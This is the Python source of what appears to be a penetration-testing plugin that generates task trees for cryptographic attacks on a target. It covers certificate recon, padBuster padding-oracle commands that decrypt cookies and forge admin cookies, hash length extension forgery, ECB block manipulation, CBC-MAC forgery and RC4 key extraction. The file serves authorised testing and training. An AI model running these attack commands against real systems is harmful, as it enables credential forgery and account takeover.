"""
Cryptography service enumeration plugin

Generates tasks for cryptographic analysis including:
- Padding oracle attacks (CBC mode)
- Hash length extension attacks
- Cipher mode vulnerabilities (ECB, CBC-MAC)
- RC4 weaknesses
- Certificate analysis

Extracted from HackTricks: crypto-and-stego/
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class CryptographyPlugin(ServicePlugin):
    """Cryptography analysis plugin"""

    @property
    def name(self) -> str:
        return "cryptography"

    @property
    def default_ports(self) -> List[int]:
        return []

    @property
    def service_names(self) -> List[str]:
        return ['crypto', 'cipher', 'encryption']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> float:
        """Detect cryptography-related services with confidence scoring

        Returns:
            Confidence score (0-100):
            - 100: Pure cryptography service (crypto, cipher in name)
            - 50: TLS/SSL related but not HTTPS (ssl, tls in service name)
            - 0: Regular HTTPS web services (handled by HTTP plugin)

        Note: This plugin should NOT handle standard HTTPS web services.
        The HTTP plugin has higher priority for ports 443/8443/9443 with HTTP-like services.
        """
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Perfect match: Pure cryptography services
        if any(svc in service for svc in ['crypto', 'cipher', 'encryption']):
            return 100

        # Medium confidence: TLS/SSL services but NOT HTTPS web services
        # Let HTTP plugin handle web services on these ports
        if 'https' in service or 'http' in service:
            return 0  # Defer to HTTP plugin

        if any(svc in service for svc in ['ssl', 'tls']):
            return 50

        # Low confidence: HTTPS ports WITHOUT explicit service name
        # Only claim if service is unknown/generic
        if port in [443, 8443, 9443]:
            if service in ['', 'unknown', 'tcpwrapped']:
                return 30  # Low confidence - might be HTTPS
            return 0  # Explicit service name - defer to appropriate plugin

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate cryptography analysis task tree"""
        version = service_info.get('version', '')

        tasks = {
            'id': f'crypto-analysis-{port}',
            'name': f'Cryptographic Analysis (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Certificate Analysis (for HTTPS/TLS)
        if port in [443, 8443, 9443] or 'https' in service_info.get('service', '').lower():
            tasks['children'].append({
                'id': f'cert-analysis-{port}',
                'name': 'Certificate Analysis',
                'type': 'parent',
                'children': [
                    {
                        'id': f'cert-download-{port}',
                        'name': 'Download Certificate',
                        'type': 'command',
                        'metadata': {
                            'command': f'openssl s_client -connect {target}:{port} -showcerts </dev/null 2>/dev/null | openssl x509 -outform PEM > cert.pem',
                            'description': 'Download and save server certificate for analysis',
                            'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL'],
                            'flag_explanations': {
                                's_client': 'OpenSSL SSL/TLS client program',
                                '-connect': 'Specify host:port to connect to',
                                '-showcerts': 'Display full certificate chain',
                                '</dev/null': 'Close connection after handshake',
                                'x509': 'X.509 certificate utility',
                                '-outform PEM': 'Output in PEM format'
                            },
                            'success_indicators': [
                                'cert.pem file created',
                                'BEGIN CERTIFICATE block visible'
                            ],
                            'failure_indicators': [
                                'Connection refused',
                                'SSL handshake failure'
                            ],
                            'next_steps': [
                                'Parse certificate fields',
                                'Check validity period',
                                'Examine Subject Alternative Names'
                            ],
                            'alternatives': [
                                f'Manual: echo | openssl s_client -connect {target}:{port} 2>/dev/null | openssl x509 -text',
                                f'Browser: View certificate in browser (lock icon)',
                                f'Online: Use crt.sh for certificate transparency logs'
                            ],
                            'notes': 'Certificates may reveal internal hostnames, subdomains, or organization details'
                        }
                    },
                    {
                        'id': f'cert-parse-{port}',
                        'name': 'Parse Certificate Details',
                        'type': 'command',
                        'metadata': {
                            'command': r'openssl x509 -in cert.pem -text -noout',
                            'description': 'Extract certificate fields (Subject, Issuer, SANs, validity)',
                            'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                            'flag_explanations': {
                                '-in': 'Input certificate file',
                                '-text': 'Print certificate in human-readable format',
                                '-noout': 'Do not output encoded version'
                            },
                            'success_indicators': [
                                'Subject and Issuer displayed',
                                'Validity dates shown',
                                'X509v3 extensions visible'
                            ],
                            'failure_indicators': [
                                'Unable to load certificate',
                                'PEM format error'
                            ],
                            'next_steps': [
                                'Check for expired certificates (authentication bypass)',
                                'Extract SANs for subdomain discovery',
                                'Verify certificate chain trust'
                            ],
                            'alternatives': [
                                'Python: from cryptography import x509; cert = x509.load_pem_x509_certificate(data)',
                                'Online: SSL Labs Server Test'
                            ],
                            'notes': 'Look for CN/SANs revealing internal infrastructure'
                        }
                    },
                    {
                        'id': f'cert-transparency-{port}',
                        'name': 'Certificate Transparency Lookup',
                        'type': 'manual',
                        'metadata': {
                            'description': 'Search Certificate Transparency logs for subdomain discovery',
                            'tags': ['OSCP:LOW', 'RECON'],
                            'alternatives': [
                                f'Online: Visit https://crt.sh/?q={target}',
                                'Online: Use Censys.io certificate search',
                                'Tool: crt.sh JSON API'
                            ],
                            'notes': 'CT logs reveal all certificates issued for domain (even expired/revoked)'
                        }
                    }
                ]
            })

        # TASK 2: Padding Oracle Attack (CBC mode)
        tasks['children'].append({
            'id': f'padding-oracle-{port}',
            'name': 'Padding Oracle Attack',
            'type': 'parent',
            'children': [
                {
                    'id': f'padding-oracle-detect-{port}',
                    'name': 'Detect Padding Oracle Vulnerability',
                    'type': 'command',
                    'metadata': {
                        'command': f'perl ./padBuster.pl http://{target}:{port}/index.php "ENCRYPTED_COOKIE" 8 -encoding 0 -cookies "login=ENCRYPTED_COOKIE"',
                        'description': 'Test for padding oracle vulnerability in CBC mode encryption',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'AUTOMATED'],
                        'flag_explanations': {
                            'ENCRYPTED_COOKIE': 'Base64-encoded encrypted cookie value',
                            '8': 'Block size in bytes (8 for DES/Blowfish, 16 for AES)',
                            '-encoding 0': 'Base64 encoding (0=base64, 1=hex, 2=lowercase hex)',
                            '-cookies': 'Send cookie in request'
                        },
                        'success_indicators': [
                            'Padding oracle found',
                            'Valid padding detected',
                            'Decryption progress shown'
                        ],
                        'failure_indicators': [
                            'No padding oracle detected',
                            'Same response for all padding values',
                            'Connection errors'
                        ],
                        'next_steps': [
                            'Decrypt entire cookie value',
                            'Encrypt new malicious payload',
                            'Escalate privileges (e.g., user=admin)'
                        ],
                        'alternatives': [
                            'Manual: Modify last byte of ciphertext, observe error messages',
                            'Python: Use PyCrypto to test padding schemes',
                            'Burp: Bit Flipper extension'
                        ],
                        'notes': 'Install: sudo apt-get install padbuster'
                    }
                },
                {
                    'id': f'padding-oracle-decrypt-{port}',
                    'name': 'Decrypt Cookie with Padding Oracle',
                    'type': 'command',
                    'metadata': {
                        'command': f'perl ./padBuster.pl http://{target}:{port}/index.php "ENCRYPTED_COOKIE" 8 -encoding 0 -cookies "login=ENCRYPTED_COOKIE" -error "Invalid padding"',
                        'description': 'Decrypt encrypted data using padding oracle',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'flag_explanations': {
                            '-error': 'Specify error message indicating padding failure'
                        },
                        'success_indicators': [
                            'Plaintext revealed (e.g., user=username)',
                            'Decryption completed'
                        ],
                        'failure_indicators': [
                            'Decryption stalled',
                            'Incorrect block size'
                        ],
                        'next_steps': [
                            'Encrypt new payload: perl ./padBuster.pl ... -plaintext "user=administrator"',
                            'Test privilege escalation',
                            'Document attack chain for report'
                        ],
                        'alternatives': [
                            'Tool: https://github.com/AonCyberLabs/PadBuster',
                            'Manual: XOR manipulation of ciphertext blocks'
                        ],
                        'notes': 'Padding oracle allows both decryption AND encryption without knowing key'
                    }
                },
                {
                    'id': f'padding-oracle-encrypt-{port}',
                    'name': 'Encrypt Malicious Payload',
                    'type': 'command',
                    'metadata': {
                        'command': f'perl ./padBuster.pl http://{target}:{port}/index.php "ENCRYPTED_COOKIE" 8 -encoding 0 -cookies "login=ENCRYPTED_COOKIE" -plaintext "user=administrator"',
                        'description': 'Encrypt arbitrary plaintext using padding oracle (privilege escalation)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC'],
                        'flag_explanations': {
                            '-plaintext': 'Plaintext to encrypt (e.g., user=admin for privilege escalation)'
                        },
                        'success_indicators': [
                            'Encrypted value generated',
                            'Valid cookie produced'
                        ],
                        'failure_indicators': [
                            'Encryption failed',
                            'Invalid format'
                        ],
                        'next_steps': [
                            'Replace cookie with encrypted payload',
                            'Test authentication bypass',
                            'Access restricted functionality'
                        ],
                        'alternatives': [
                            'Manual: Generate ciphertext via XOR with intermediary values'
                        ],
                        'notes': 'Common targets: user=admin, role=administrator, isAdmin=true'
                    }
                }
            ]
        })

        # TASK 3: Hash Length Extension Attack
        tasks['children'].append({
            'id': f'hash-length-extension-{port}',
            'name': 'Hash Length Extension Attack',
            'type': 'parent',
            'children': [
                {
                    'id': f'hash-ext-detect-{port}',
                    'name': 'Detect Vulnerable Hash Usage',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify if application uses MD5/SHA1/SHA256 for HMAC-like signing',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'success_indicators': [
                            'Hash appended to data (data + hash)',
                            'Known hash algorithm (MD5/SHA1/SHA256/SHA512)',
                            'Known secret length (or can be bruteforced)'
                        ],
                        'failure_indicators': [
                            'HMAC properly used',
                            'Unknown hash algorithm',
                            'Signature verification fails'
                        ],
                        'next_steps': [
                            'Determine secret length (bruteforce 1-64 bytes)',
                            'Prepare malicious data to append',
                            'Use hash_extender tool'
                        ],
                        'alternatives': [
                            'Look for signature=hash(secret+data) patterns',
                            'Test with known plaintext'
                        ],
                        'notes': 'Vulnerable: hash(secret+data). Safe: HMAC(key, data)'
                    }
                },
                {
                    'id': f'hash-ext-exploit-{port}',
                    'name': 'Execute Hash Length Extension',
                    'type': 'command',
                    'metadata': {
                        'command': r'hash_extender -d "known_data" -s "known_signature" -a "append_data" -f md5 -l 16',
                        'description': 'Append data and generate valid signature without knowing secret',
                        'tags': ['OSCP:LOW', 'EXPLOIT', 'AUTOMATED'],
                        'flag_explanations': {
                            '-d': 'Known data (original message)',
                            '-s': 'Known signature (hash of secret+data)',
                            '-a': 'Data to append',
                            '-f': 'Hash format (md5, sha1, sha256, sha512)',
                            '-l': 'Secret length in bytes (bruteforce if unknown)'
                        },
                        'success_indicators': [
                            'New signature generated',
                            'New data includes padding + appended content'
                        ],
                        'failure_indicators': [
                            'Signature verification fails',
                            'Incorrect secret length'
                        ],
                        'next_steps': [
                            'Submit new_data + new_signature',
                            'Verify server accepts forged signature',
                            'Escalate attack (append admin commands)'
                        ],
                        'alternatives': [
                            'Manual: Calculate padding based on (secret+data) length',
                            'Python: Implement MD5/SHA1 state manipulation'
                        ],
                        'notes': 'Tool: https://github.com/iagox86/hash_extender'
                    }
                }
            ]
        })

        # TASK 4: ECB Mode Detection and Exploitation
        tasks['children'].append({
            'id': f'ecb-mode-{port}',
            'name': 'ECB Mode Vulnerability',
            'type': 'parent',
            'children': [
                {
                    'id': f'ecb-detect-{port}',
                    'name': 'Detect ECB Mode',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify ECB mode encryption (identical plaintext blocks produce identical ciphertext)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'QUICK_WIN'],
                        'success_indicators': [
                            'Same cookie for multiple logins',
                            'Identical ciphertext blocks for repeated plaintext',
                            'Block-level patterns visible in hex'
                        ],
                        'failure_indicators': [
                            'Different cookies each login (likely CBC/CTR)',
                            'No repeating blocks'
                        ],
                        'next_steps': [
                            'Create users with controlled usernames',
                            'Identify block size (8 or 16 bytes)',
                            'Map username/password positions in cookie'
                        ],
                        'alternatives': [
                            'Create user "aaaaaaaa" and observe cookie blocks',
                            'Decode base64 cookie and analyze hex patterns',
                            'Use CyberChef to visualize repeating blocks'
                        ],
                        'notes': 'ECB mode allows block removal and reordering attacks'
                    }
                },
                {
                    'id': f'ecb-exploit-block-removal-{port}',
                    'name': 'ECB Block Removal Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Remove blocks to impersonate different user (e.g., aaaaaaaaadmin -> admin)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                        'success_indicators': [
                            'Valid cookie for target username',
                            'Authentication as different user'
                        ],
                        'failure_indicators': [
                            'Invalid cookie after block removal',
                            'Signature verification fails'
                        ],
                        'next_steps': [
                            'Create username that produces target blocks',
                            'Remove padding blocks',
                            'Test authentication'
                        ],
                        'alternatives': [
                            'Python: Base64 decode, remove blocks, re-encode',
                            'Burp: Modify cookie manually',
                            'CyberChef: From Base64 -> Remove bytes -> To Base64'
                        ],
                        'notes': 'Example: username "aaaaaaaaadmin" -> remove first block -> "admin"'
                    }
                },
                {
                    'id': f'ecb-exploit-block-swap-{port}',
                    'name': 'ECB Block Swapping Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Reorder blocks to forge credentials (username|password -> password|username)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                        'success_indicators': [
                            'Successfully swapped blocks',
                            'Impersonated target user'
                        ],
                        'failure_indicators': [
                            'Cookie rejected',
                            'Block boundaries misaligned'
                        ],
                        'next_steps': [
                            'Create username with exact block alignment',
                            'Craft password to contain target username + padding',
                            'Swap blocks and test'
                        ],
                        'alternatives': [
                            'Create user "username       " and password "admin   "',
                            'Swap blocks: block1,block2,block3 -> block3,block1,block2'
                        ],
                        'notes': 'Databases often ignore trailing spaces: admin == "admin   "'
                    }
                }
            ]
        })

        # TASK 5: CBC-MAC Privilege Escalation
        tasks['children'].append({
            'id': f'cbc-mac-{port}',
            'name': 'CBC-MAC Privilege Escalation',
            'type': 'parent',
            'children': [
                {
                    'id': f'cbc-mac-detect-{port}',
                    'name': 'Detect CBC-MAC Usage',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify CBC-MAC authentication (common in cookie signing)',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'success_indicators': [
                            'Fixed-length MAC appended to data',
                            'IV = 0 (common in CBC-MAC)',
                            'Known plaintext available'
                        ],
                        'failure_indicators': [
                            'HMAC used (secure)',
                            'Unknown MAC algorithm'
                        ],
                        'next_steps': [
                            'Obtain MAC for known messages',
                            'Calculate XOR values for forgery',
                            'Test privilege escalation'
                        ],
                        'alternatives': [
                            'Observe MAC behavior with multiple messages'
                        ],
                        'notes': 'CBC-MAC with IV=0 allows forgery attacks'
                    }
                },
                {
                    'id': f'cbc-mac-exploit-{port}',
                    'name': 'CBC-MAC Forgery',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Forge valid MAC for concatenated messages (m1 + (m2 XOR MAC1))',
                        'tags': ['OSCP:LOW', 'EXPLOIT', 'MANUAL'],
                        'success_indicators': [
                            'Valid MAC for target message',
                            'Privilege escalation achieved'
                        ],
                        'failure_indicators': [
                            'MAC verification fails',
                            'XOR calculation incorrect'
                        ],
                        'next_steps': [
                            'Get MAC for "Administ" (m1, s1)',
                            'XOR "rator\\x00\\x00\\x00" with s1 to get m2',
                            'Get MAC for m2 (this is valid MAC for "Administrator")'
                        ],
                        'alternatives': [
                            'Python: bytes([a ^ b for a, b in zip(m2, s1)])',
                            'CyberChef: XOR operation'
                        ],
                        'notes': 'Attack: E(m1 XOR 0) = s1, E(m2 XOR s1) = s2 -> valid for m1||m2'
                    }
                }
            ]
        })

        # TASK 6: RC4 Weaknesses
        tasks['children'].append({
            'id': f'rc4-analysis-{port}',
            'name': 'RC4 Weakness Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'rc4-detect-{port}',
                    'name': 'Detect RC4 Usage',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify RC4 cipher in use (deprecated, many weaknesses)',
                        'tags': ['OSCP:LOW', 'RECON'],
                        'success_indicators': [
                            'RC4 cipher suite negotiated',
                            'Application mentions RC4/ARC4/ARCFOUR'
                        ],
                        'failure_indicators': [
                            'Modern ciphers in use (AES-GCM, ChaCha20)'
                        ],
                        'next_steps': [
                            'Test encryption oracle access',
                            'Attempt key extraction via encryption',
                            'Search for RC4 biases'
                        ],
                        'alternatives': [
                            'nmap --script ssl-enum-ciphers',
                            'testssl.sh'
                        ],
                        'notes': 'RC4 deprecated in TLS 1.2, forbidden in TLS 1.3'
                    }
                },
                {
                    'id': f'rc4-key-extract-{port}',
                    'name': 'RC4 Key Extraction',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract RC4 key by encrypting known plaintext (if encryption oracle available)',
                        'tags': ['OSCP:LOW', 'EXPLOIT'],
                        'success_indicators': [
                            'Key extracted from ciphertext',
                            'Can decrypt all RC4-encrypted data'
                        ],
                        'failure_indicators': [
                            'No encryption oracle',
                            'Key extraction failed'
                        ],
                        'next_steps': [
                            'Use extracted key to decrypt sensitive data',
                            'Encrypt malicious payloads with same key'
                        ],
                        'alternatives': [
                            'Manual: XOR known plaintext with ciphertext to get keystream',
                            'HTB Kryptos: https://0xrick.github.io/hack-the-box/kryptos/'
                        ],
                        'notes': 'RC4 encryption/decryption are same operation (XOR with keystream)'
                    }
                }
            ]
        })

        return tasks
